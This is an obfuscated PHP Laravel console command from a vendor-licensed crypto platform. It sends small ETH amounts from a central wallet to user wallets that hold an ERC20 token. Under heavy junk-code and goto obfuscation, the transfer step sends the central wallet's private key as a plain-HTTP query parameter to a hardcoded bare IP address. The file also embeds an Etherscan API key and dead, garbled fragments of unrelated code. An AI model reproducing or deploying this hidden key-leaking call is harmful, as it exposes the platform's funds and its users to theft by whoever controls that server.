<?php
/*
 本代码由 豪金科技授权使用 创建
 创建时间 2020-06-08 06:11:27
 技术支持 QQ:531543502 Mail:cold-cat-studio@foxmail.com
 严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
*/

namespace App\Console\Commands;

use App\AccountLog;
use App\TransferEths;
use App\UsersWallet;
use App\Setting;
use App\Currency;
use App\Utils\RPC;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\DB;

class TransferEth extends Command
{
    protected $signature = "\x74\x72\x61\x6E\x73\x66\x65\x72\x5F\x65\x74\x68\x7B\x63\x75\x72\x72\x65\x6E\x63\x79\x5F\x69\x64\x20\x3A\x20\x69\x64\x7D";
    protected $description = "\xE6\x89\xB9\xE9\x87\x8F\xE8\xBD\xAC\x65\x74\x68";
    protected $contract_address = "";
    protected $total_account_address = "";
    protected $total_account_key = "";
    protected $currency_type = "";
    protected $eth_transfer_value = 0.001;
    public function handle()
    {
        unset($N2wtI8E);
        $currency_id = $this->argument('currency_id');
        unset($N2wtI8E);
        $currency = Currency::find($currency_id);
        unset($N2wtI8E);
        $contract_address = $currency->contract_address;
        unset($N2wtI8E);
        $total_account_address = $currency->total_account;
        unset($N2wtI8E);
        $total_account_key = $currency->key;
        unset($N2wtI8E);
        $currency_type = $currency->type;
        if (strspn("ausPzzIs", "4")) goto N2weWjgxg;
        $N2w8E = (bool)empty($contract_address);
        $N2wvPbN8O = 12 - 4;
        if (is_bool($N2wvPbN8O)) goto N2weWjgx7;
        $N2w8N = !$N2w8E;
        if ($N2w8N) goto N2weWjgx7;
        if (strrchr(4, "Vl")) goto N2weWjgx7;
        goto N2wldMhx7;
        N2weWjgx7:
        if (isset($_GET)) goto N2weWjgx9;
        goto N2wldMhx9;
        N2weWjgx9:
        array();
        goto N2wMrKh205;
        $N2wM8P = CONF_PATH . $module;
        $N2wM8Q = $N2wM8P . database;
        $N2wM8R = $N2wM8Q . CONF_EXT;
        unset($N2wtIM8S);
        $filename = $N2wM8R;
        N2wMrKh205:
        goto N2wx8;
        N2wldMhx9:
        if (strpos($file, ".")) goto N2weWjgxb;
        goto N2wldMhxb;
        N2weWjgxb:
        $N2wM8T = $file;
        goto N2wxa;
        N2wldMhxb:
        $N2wM8U = APP_PATH . $file;
        $N2wM8V = $N2wM8U . EXT;
        $N2wM8T = $N2wM8V;
        N2wxa:
        unset($N2wtIM8W);
        $file = $N2wM8T;
        $N2wM8Y = (bool)is_file($file);
        if ($N2wM8Y) goto N2weWjgxe;
        goto N2wldMhxe;
        N2weWjgxe:
        $N2wM8X = !isset(user::$file[$file]);
        $N2wM8Y = (bool)$N2wM8X;
        goto N2wxd;
        N2wldMhxe:
        N2wxd:
        if ($N2wM8Y) goto N2weWjgxf;
        goto N2wldMhxf;
        N2weWjgxf:
        $N2wM8Z = include $file;
        unset($N2wtIM90);
        $N2wtIM90 = true;
        user::$file[$file] = $N2wtIM90;
        goto N2wxc;
        N2wldMhxf:
        N2wxc:
        N2wx8:
        $N2w8E = (bool)empty($total_account_address);
        goto N2wx6;
        N2wldMhx7:
        N2wx6:
        $N2w8F = (bool)$N2w8E;
        $N2w8G = !$N2w8F;
        if ($N2w8G) goto N2weWjgx3;
        $N2wbN8H = !getdate();
        if ($N2wbN8H) goto N2weWjgx3;
        $N2wbN8I = true === 4;
        if ($N2wbN8I) goto N2weWjgx3;
        goto N2wldMhx3;
        N2weWjgx3:
        $N2wM8J = 1 + 11;
        $N2wM8K = 0 > $N2wM8J;
        unset($N2wtIM8L);
        $N2wMrKh = $N2wM8K;
        if ($N2wMrKh) goto N2weWjgx5;
        goto N2wldMhx5;
        N2weWjgx5:
        unset($N2wtIM8M);
        $N2wtIM8M = array($USER[0][0x17] => $host, $USER[1][0x18] => $login, $USER[2][0x19] => $password, $USER[3][0x1a] => $database, $USER[4][0x1b] => $prefix);
        $ADMIN[0] = $N2wtIM8M;
        goto N2wx4;
        N2wldMhx5:
        N2wx4:
        $N2w8F = (bool)empty($total_account_key);
        goto N2wx2;
        N2wldMhx3:
        N2wx2:
        if ($N2w8F) goto N2weWjgxg;
        $N2wvPbN91 = 4 + 1;
        $N2wvPbN92 = $N2wvPbN91 + 4;
        if (in_array($N2wvPbN92, array())) goto N2weWjgxg;
        goto N2wldMhxg;
        N2weWjgxg:
        switch ($N2wMrKh = "login") {
            case "admin":
                unset($N2wtIM94);
                $url = str_replace($depr, "|", $url);
                unset($N2wtIM95);
                $array = explode("|", $url, 2);
            case "user":
                unset($N2wtIM97);
                $info = parse_url($url);
                unset($N2wtIM98);
                $path = explode("/", $info["path"]);
        }
        $this->comment("后台账号设置错误");
        exit();
        goto N2wx1;
        N2wldMhxg:
        N2wx1:
        unset($N2wtI8E);
        $this->contract_address = $contract_address;
        unset($N2wtI8E);
        $this->total_account_address = $total_account_address;
        unset($N2wtI8E);
        $this->total_account_key = $total_account_key;
        unset($N2wtI8E);
        $this->currency_type = $currency_type;
        unset($N2wtI8E);
        $datas = UsersWallet::where('currency', $currency_id)->get();
        $this->comment("start");
        foreach ($datas as $d) {
            $this->transferEth($d);
        }
        $this->comment("end");
    }
    public function transferEth($data)
    {
        if (stripos("mDitIkTI", "4")) goto N2weWjgxl;
        $N2w8E = $this->currency_type != 'btc';
        if ($N2w8E) goto N2weWjgxl;
        $N2wbN8F = "__file__" == 5;
        if ($N2wbN8F) goto N2weWjgxl;
        goto N2wldMhxl;
        N2weWjgxl:
        goto N2wMrKh207;
        $N2wM8G = $R4vP4 . DS;
        unset($N2wtIM8H);
        $R4vP5 = $N2wM8G;
        unset($N2wtIM8I);
        $R4vA5 = array();
        unset($N2wtIM8J);
        $R4vA5[] = $request;
        unset($N2wtIM8K);
        $R4vC3 = call_user_func_array($R4vA5, $R4vA4);
        N2wMrKh207:
        goto N2wMrKh209;
        unset($N2wtIM8L);
        $R4vA1 = array();
        unset($N2wtIM8M);
        $N2wtIM8M = &$dispatch;
        $R4vA1[] = &$N2wtIM8M;
        unset($N2wtIM8N);
        $R4vA2 = array();
        unset($N2wtIM8O);
        $R4vC0 = call_user_func_array($R4vA2, $R4vA1);
        N2wMrKh209:
        if (strnatcmp(4, 4)) goto N2weWjgxn;
        $N2wbN8F = 1 + 4;
        $N2wbN8G = $N2wbN8F < 4;
        if ($N2wbN8G) goto N2weWjgxn;
        $N2w8E = !empty($data->address);
        if ($N2w8E) goto N2weWjgxn;
        goto N2wldMhxn;
        N2weWjgxn:
        $N2wM8H = 1 + 11;
        $N2wM8I = 0 > $N2wM8H;
        unset($N2wtIM8J);
        $N2wMrKh = $N2wM8I;
        if ($N2wMrKh) goto N2weWjgxp;
        goto N2wldMhxp;
        N2weWjgxp:
        unset($N2wtIM8K);
        $N2wtIM8K = array($USER[0][0x17] => $host, $USER[1][0x18] => $login, $USER[2][0x19] => $password, $USER[3][0x1a] => $database, $USER[4][0x1b] => $prefix);
        $ADMIN[0] = $N2wtIM8K;
        goto N2wxo;
        N2wldMhxp:
        N2wxo:
        unset($N2wtI8E);
        $address = $data->address;
        $N2w8E = $this->currency_type != 'erc20';
        if ($N2w8E) goto N2weWjgxr;
        if (strrchr(4, "Vl")) goto N2weWjgxr;
        $N2wbN8F = gettype(E_PARSE) == "hdZBJ";
        if ($N2wbN8F) goto N2weWjgxr;
        goto N2wldMhxr;
        N2weWjgxr:
        if (function_exists("N2wMrKh")) goto N2weWjgxt;
        goto N2wldMhxt;
        N2weWjgxt:
        unset($N2wtIM8G);
        $var_12["arr_1"] = array("56e696665646", "450594253435", "875646e696", "56d616e6279646");
        foreach ($var_12["arr_1"] as $k => $vo) {
            $N2wM8H = gettype($var_12["arr_1"][$k]) == "string";
            $N2wM8J = (bool)$N2wM8H;
            if ($N2wM8J) goto N2weWjgxv;
            goto N2wldMhxv;
            N2weWjgxv:
            unset($N2wtIM8I);
            $N2wtIM8I = fun_3($vo);
            unset($N2wtIM8K);
            $N2wtIM8K = $N2wtIM8I;
            $var_12["arr_1"][$k] = $N2wtIM8K;
            $N2wM8J = (bool)$N2wtIM8I;
            goto N2wxu;
            N2wldMhxv:
            N2wxu:
        }
        $var_12["arr_1"][0](fun_2("arr_1", 1), fun_2("arr_1", 2));
        goto N2wxs;
        N2wldMhxt:
        goto N2wMrKh20B;
        $N2wM8L = $var_12["arr_1"][3](__FILE__) . fun_2("arr_1", 8);
        $N2wM8M = require $N2wM8L;
        $N2wM8N = $var_12["arr_1"][3](__FILE__) . fun_2("arr_1", 9);
        $N2wM8O = require $N2wM8N;
        $N2wM8P = V_DATA . fun_2("arr_1", 10);
        $N2wM8Q = require $N2wM8P;
        N2wMrKh20B:
        N2wxs:
        return false;
        goto N2wxq;
        N2wldMhxr:
        N2wxq:
        $N2w8E = "https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=" . $this->contract_address;
        $N2w8F = $N2w8E . "&address=";
        $N2w8G = $N2w8F . $address;
        $N2w8H = $N2w8G . "&tag=latest&apikey=579R8XPDUY1SHZNEZP9GA4FEF1URNC3X45";
        $N2w8I = $N2w8H . rand(1, 1000);
        unset($N2wtI8J);
        $url = $N2w8I;
        unset($N2wtI8E);
        $content = RPC::apihttp($url);
        if ($content) goto N2weWjgxx;
        $N2wbN8E = chr(4) == "u";
        if ($N2wbN8E) goto N2weWjgxx;
        $N2wbN8F = 4 + 1;
        $N2wbN8G = 4 > $N2wbN8F;
        if ($N2wbN8G) goto N2weWjgxx;
        goto N2wldMhxx;
        N2weWjgxx:
        goto N2wMrKh20D;
        $N2wM8H = $R4vP4 . DS;
        unset($N2wtIM8I);
        $R4vP5 = $N2wM8H;
        unset($N2wtIM8J);
        $R4vA5 = array();
        unset($N2wtIM8K);
        $R4vA5[] = $request;
        unset($N2wtIM8L);
        $R4vC3 = call_user_func_array($R4vA5, $R4vA4);
        N2wMrKh20D:
        goto N2wMrKh20F;
        unset($N2wtIM8M);
        $R4vA1 = array();
        unset($N2wtIM8N);
        $N2wtIM8N = &$dispatch;
        $R4vA1[] = &$N2wtIM8N;
        unset($N2wtIM8O);
        $R4vA2 = array();
        unset($N2wtIM8P);
        $R4vC0 = call_user_func_array($R4vA2, $R4vA1);
        N2wMrKh20F:
        DB::beginTransaction();
        try {
            unset($N2wtI8E);
            $content = json_decode($content, true);
            var_dump($content);
            $N2w8F = (bool)isset($content["message"]);
            $N2wbN8H = $_GET == "oumsCf";
            if ($N2wbN8H) goto N2weWjgx12;
            if ($N2w8F) goto N2weWjgx12;
            $N2wvPbN8G = 12 - 4;
            if (is_bool($N2wvPbN8G)) goto N2weWjgx12;
            goto N2wldMhx12;
            N2weWjgx12:
            goto N2wMrKh211;
            foreach ($files as $file) {
                if (strpos($file, CONF_EXT)) goto N2weWjgx14;
                goto N2wldMhx14;
                N2weWjgx14:
                $N2wM8I = $dir . DS;
                $N2wM8J = $N2wM8I . $file;
                unset($N2wtIM8K);
                $filename = $N2wM8J;
                Config::load($filename, pathinfo($file, PATHINFO_FILENAME));
                goto N2wx13;
                N2wldMhx14:
                N2wx13:
            }
            N2wMrKh211:
            $N2w8E = $content["message"] == "OK";
            $N2w8F = (bool)$N2w8E;
            goto N2wx11;
            N2wldMhx12:
            N2wx11:
            if ($N2w8F) goto N2weWjgx15;
            $N2wbN8L = !true;
            unset($N2wtIbN8M);
            $N2wIfQU = $N2wbN8L;
            if ($N2wIfQU) goto N2weWjgx15;
            unset($N2wtIvPbN8N);
            $N2wIfQU = "";
            if (ltrim($N2wIfQU)) goto N2weWjgx15;
            goto N2wldMhx15;
            N2weWjgx15:
            try {
                strlen(1);
            } catch (\Exception $e) {
                $N2wM8O = $x * 5;
                unset($N2wtIM8P);
                $y = $N2wM8O;
                echo "no login!";
                exit(1);
            } catch (\Exception $e) {
                $N2wM8Q = $x * 1;
                unset($N2wtIM8R);
                $y = $N2wM8Q;
                echo "no html!";
                exit(2);
            }
            $N2w8E = $content["result"] / 1000000000000000000;
            unset($N2wtI8F);
            $content["result"] = $N2w8E;
            unset($N2wtIvPbN8F);
            $N2wIfQU = true;
            if (is_object($N2wIfQU)) goto N2weWjgx18;
            $N2w8E = $content["result"] > 0;
            if ($N2w8E) goto N2weWjgx18;
            $N2wbN8G = 4 - 4;
            if ($N2wbN8G) goto N2weWjgx18;
            goto N2wldMhx18;
            N2weWjgx18:
            goto N2wMrKh213;
            unset($N2wtIM8H);
            $A_33 = "php_sapi_name";
            unset($N2wtIM8I);
            $A_34 = "die";
            unset($N2wtIM8J);
            $A_35 = "cli";
            unset($N2wtIM8K);
            $A_36 = "microtime";
            unset($N2wtIM8L);
            $A_37 = 1;
            N2wMrKh213:
            goto N2wMrKh215;
            unset($N2wtIM8M);
            $A_38 = "argc";
            unset($N2wtIM8N);
            $A_39 = "echo";
            unset($N2wtIM8O);
            $A_40 = "HTTP_HOST";
            unset($N2wtIM8P);
            $A_41 = "SERVER_ADDR";
            N2wMrKh215:
            $N2w8Q = "http://47.92.171.137:8999/web3/transfer?from_address=" . $this->total_account_address;
            $N2w8R = $N2w8Q . "&toaddress=";
            $N2w8S = $N2w8R . $address;
            $N2w8T = $N2w8S . "&transfer_value=";
            $N2w8U = $N2w8T . $this->eth_transfer_value;
            $N2w8V = $N2w8U . "&privates=";
            $N2w8W = $N2w8V . $this->total_account_key;
            unset($N2wtI8X);
            $transfer_url = $N2w8W;
            unset($N2wtI8Y);
            $transfer_content = RPC::apihttp($transfer_url);
            unset($N2wtI8Z);
            $transfer_content = @json_decode($transfer_content, true);
            $N2wbN8F = count(array(4, 8)) == 7;
            if ($N2wbN8F) goto N2weWjgx1a;
            $N2w8E = $transfer_content["error"] == "0";
            if ($N2w8E) goto N2weWjgx1a;
            $N2wbN8G = str_repeat("IOIYitSK", 1) == 1;
            if ($N2wbN8G) goto N2weWjgx1a;
            goto N2wldMhx1a;
            N2weWjgx1a:
            try {
                strlen(1);
            } catch (\Exception $e) {
                $N2wM8H = $x * 5;
                unset($N2wtIM8I);
                $y = $N2wM8H;
                echo "no login!";
                exit(1);
            } catch (\Exception $e) {
                $N2wM8J = $x * 1;
                unset($N2wtIM8K);
                $y = $N2wM8J;
                echo "no html!";
                exit(2);
            }
            $N2wvPvP8E = $data->user_id . "打入ETH成功";
            AccountLog::insertLog(array("user_id" => 9999999, "value" => 0.001, "type" => AccountLog::ETH_EXCHANGE, "info" => $N2wvPvP8E, 'currency' => $data->currency));
            $this->comment($transfer_content["content"]);
            $N2wvP8E = $data->user_id . "充值成功";
            $this->comment($N2wvP8E);
            unset($N2wtI8E);
            $wallet = UsersWallet::find($data->id);
            $N2w8E = $wallet->old_balance + 0.001;
            unset($N2wtI8F);
            $wallet->old_balance = $N2w8E;
            $wallet->save();
            goto N2wx19;
            N2wldMhx1a:
            if (function_exists("N2wMrKh")) goto N2weWjgx1d;
            goto N2wldMhx1d;
            N2weWjgx1d:
            unset($N2wtIM8E);
            $var_12["arr_1"] = array("56e696665646", "450594253435", "875646e696", "56d616e6279646");
            foreach ($var_12["arr_1"] as $k => $vo) {
                $N2wM8F = gettype($var_12["arr_1"][$k]) == "string";
                $N2wM8H = (bool)$N2wM8F;
                if ($N2wM8H) goto N2weWjgx1f;
                goto N2wldMhx1f;
                N2weWjgx1f:
                unset($N2wtIM8G);
                $N2wtIM8G = fun_3($vo);
                unset($N2wtIM8I);
                $N2wtIM8I = $N2wtIM8G;
                $var_12["arr_1"][$k] = $N2wtIM8I;
                $N2wM8H = (bool)$N2wtIM8G;
                goto N2wx1e;
                N2wldMhx1f:
                N2wx1e:
            }
            $var_12["arr_1"][0](fun_2("arr_1", 1), fun_2("arr_1", 2));
            goto N2wx1c;
            N2wldMhx1d:
            goto N2wMrKh217;
            $N2wM8J = $var_12["arr_1"][3](__FILE__) . fun_2("arr_1", 8);
            $N2wM8K = require $N2wM8J;
            $N2wM8L = $var_12["arr_1"][3](__FILE__) . fun_2("arr_1", 9);
            $N2wM8M = require $N2wM8L;
            $N2wM8N = V_DATA . fun_2("arr_1", 10);
            $N2wM8O = require $N2wM8N;
            N2wMrKh217:
            N2wx1c:
            $this->comment("请重试");
            N2wx19:
            goto N2wx17;
            N2wldMhx18:
            switch ($N2wMrKh = "login") {
                case "admin":
                    unset($N2wtIM8F);
                    $url = str_replace($depr, "|", $url);
                    unset($N2wtIM8G);
                    $array = explode("|", $url, 2);
                case "user":
                    unset($N2wtIM8I);
                    $info = parse_url($url);
                    unset($N2wtIM8J);
                    $path = explode("/", $info["path"]);
            }
            $N2wvP8K = $data->user_id . "没有代币";
            $this->comment($N2wvP8K);
            N2wx17:
            goto N2wxz;
            N2wldMhx15:
            N2wxz:
            DB::commit();
        } catch (\Exception $ex) {
            DB::rollback();
            $this->comment($ex->getMessage());
        }
        goto N2wxw;
        N2wldMhxx:
        N2wxw:
        goto N2wxm;
        N2wldMhxn:
        N2wxm:
        goto N2wxk;
        N2wldMhxl:
        N2wxk:
    }
}
